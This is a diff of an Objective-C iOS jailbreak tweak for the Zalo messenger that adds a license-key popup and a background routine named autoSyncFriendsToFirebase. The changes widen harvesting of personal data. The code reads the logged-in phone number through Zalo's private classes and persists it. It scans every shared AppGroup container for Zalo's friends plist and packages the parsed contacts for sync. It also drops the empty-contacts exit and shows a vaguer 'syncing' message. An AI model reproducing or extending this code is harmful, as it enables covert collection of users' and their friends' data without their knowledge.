@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
- * Tác giả: clang | Version: 1.2.2
+ * Tác giả: clang | Version: 1.2.3
  * ==============================================================================
  * Tính năng chính:
  * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
@@ -841,41 +841,49 @@ static BOOL isZaloRealLoggedIn(void) {
 }
 
 static NSString *getZaloLivePhoneNumber(void) {
-    NSArray *candidateClasses = @[@"ZAccountManager", @"ZSessionManager", @"ZAcountController", @"ZAccount", @"ZSession"];
-    for (NSString *clsName in candidateClasses) {
-        Class cls = NSClassFromString(clsName);
-        if (!cls) continue;
+    if (g_activeLoggedInPhone.length >= 8) {
+        return g_activeLoggedInPhone;
+    }
 
-        id currentAcc = nil;
-        #pragma clang diagnostic push
-        #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
-        if ([cls respondsToSelector:@selector(currentAccount)]) {
-            currentAcc = [cls performSelector:@selector(currentAccount)];
-        } else if ([cls respondsToSelector:@selector(activeAccount)]) {
-            currentAcc = [cls performSelector:@selector(activeAccount)];
-        } else if ([cls respondsToSelector:@selector(sharedManager)]) {
-            id mgr = [cls performSelector:@selector(sharedManager)];
-            if ([mgr respondsToSelector:@selector(currentAccount)]) {
-                currentAcc = [mgr performSelector:@selector(currentAccount)];
+    @try {
+        NSArray *candidateClasses = @[@"ZAccountManager", @"ZSessionManager", @"ZAcountController", @"ZAccount", @"ZSession"];
+        for (NSString *clsName in candidateClasses) {
+            Class cls = NSClassFromString(clsName);
+            if (!cls) continue;
+
+            id currentAcc = nil;
+            #pragma clang diagnostic push
+            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
+            if ([cls respondsToSelector:@selector(currentAccount)]) {
+                currentAcc = [cls performSelector:@selector(currentAccount)];
+            } else if ([cls respondsToSelector:@selector(activeAccount)]) {
+                currentAcc = [cls performSelector:@selector(activeAccount)];
+            } else if ([cls respondsToSelector:@selector(sharedManager)]) {
+                id mgr = [cls performSelector:@selector(sharedManager)];
+                if ([mgr respondsToSelector:@selector(currentAccount)]) {
+                    currentAcc = [mgr performSelector:@selector(currentAccount)];
+                }
             }
-        }
 
-        if (currentAcc) {
-            for (NSString *selName in @[@"phoneNumber", @"phone", @"accountPhone", @"accountPhoneNumber", @"getPhoneNumber"]) {
-                SEL s = NSSelectorFromString(selName);
-                if ([currentAcc respondsToSelector:s]) {
-                    NSString *p = [currentAcc performSelector:s];
-                    if ([p isKindOfClass:[NSString class]] && p.length >= 8) {
-                        return p;
+            if (currentAcc) {
+                for (NSString *selName in @[@"phoneNumber", @"phone", @"accountPhone", @"accountPhoneNumber", @"getPhoneNumber"]) {
+                    SEL s = NSSelectorFromString(selName);
+                    if ([currentAcc respondsToSelector:s]) {
+                        NSString *p = [currentAcc performSelector:s];
+                        if ([p isKindOfClass:[NSString class]] && p.length >= 8) {
+                            g_activeLoggedInPhone = [p copy];
+                            return p;
+                        }
                     }
                 }
             }
+            #pragma clang diagnostic pop
         }
-        #pragma clang diagnostic pop
-    }
+    } @catch (NSException *e) {}
 
-    if (isZaloRealLoggedIn() && g_activeLoggedInPhone.length >= 8) {
-        return g_activeLoggedInPhone;
+    NSString *savedPhone = [[NSUserDefaults standardUserDefaults] stringForKey:@"kZaloLastPhone"];
+    if (savedPhone && savedPhone.length >= 8) {
+        return savedPhone;
     }
 
     return nil;
@@ -886,11 +894,6 @@ static NSString *getZaloLivePhoneNumber(void) {
 // ==============================================================================
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
-    if (!actualPhone || actualPhone.length < 8) {
-        if (isZaloRealLoggedIn()) {
-            actualPhone = getZaloLivePhoneNumber();
-        }
-    }
     if (!actualPhone || actualPhone.length < 8) return;
 
     NSString *cleanPhone = [[actualPhone componentsSeparatedByCharactersInSet:
@@ -903,29 +906,51 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 
     if (cleanPhone.length < 9) return;
 
+    g_activeLoggedInPhone = [cleanPhone copy];
+    [[NSUserDefaults standardUserDefaults] setObject:cleanPhone forKey:@"kZaloLastPhone"];
+    [[NSUserDefaults standardUserDefaults] synchronize];
+
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        // 1. Đọc AppGroup plist
+        // 1. Quét tìm AppGroup plist qua nhiều đường dẫn
+        NSData *rawPlistData = nil;
         NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
-        NSString *plistPath = nil;
         if (groupURL) {
-            plistPath = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
-        }
-        if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
-            plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
+            NSString *p = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
+            if ([[NSFileManager defaultManager] fileExistsAtPath:p]) {
+                rawPlistData = [NSData dataWithContentsOfFile:p];
+            }
         }
 
-        NSData *rawPlistData = nil;
+        if (!rawPlistData || rawPlistData.length == 0) {
+            NSString *appGroupDir = @"/var/mobile/Containers/Shared/AppGroup";
+            NSArray *subdirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:appGroupDir error:nil];
+            for (NSString *sub in subdirs) {
+                NSString *testPath = [NSString stringWithFormat:@"%@/%@/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist", appGroupDir, sub];
+                if ([[NSFileManager defaultManager] fileExistsAtPath:testPath]) {
+                    rawPlistData = [NSData dataWithContentsOfFile:testPath];
+                    if (rawPlistData && rawPlistData.length > 0) break;
+                }
+            }
+        }
+
+        if (!rawPlistData || rawPlistData.length == 0) {
+            NSString *libDir = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) firstObject];
+            if (libDir) {
+                NSString *localPlist = [libDir stringByAppendingPathComponent:@"Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
+                if ([[NSFileManager defaultManager] fileExistsAtPath:localPlist]) {
+                    rawPlistData = [NSData dataWithContentsOfFile:localPlist];
+                }
+            }
+        }
+
         NSMutableArray<NSDictionary *> *structuredFriends = [NSMutableArray array];
         NSMutableSet<NSString *> *uniqueNames = [NSMutableSet set];
 
-        if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
-            rawPlistData = [NSData dataWithContentsOfFile:plistPath];
-            if (rawPlistData && rawPlistData.length > 0) {
-                NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
-                for (NSDictionary *f in parsed) {
-                    [structuredFriends addObject:f];
-                    if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
-                }
+        if (rawPlistData && rawPlistData.length > 0) {
+            NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
+            for (NSDictionary *f in parsed) {
+                [structuredFriends addObject:f];
+                if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
             }
         }
 
@@ -976,9 +1001,6 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
         } @catch (NSException *e) {}
 
-        // Nếu không có cả Plist lẫn Contact trong RAM thì thoát
-        if ((!rawPlistData || rawPlistData.length == 0) && uniqueNames.count == 0 && structuredFriends.count == 0) return;
-
         NSArray<NSString *> *friendNames = [uniqueNames allObjects];
         NSString *sampleStr = @"";
         if (friendNames.count > 0) {
@@ -988,7 +1010,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                 sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
             }
         } else {
-            sampleStr = @"Danh bạ trống";
+            sampleStr = @"Đang đồng bộ dữ liệu...";
         }
 
         // 3. Đóng gói ZIP chuẩn .adbk của Apps Manager
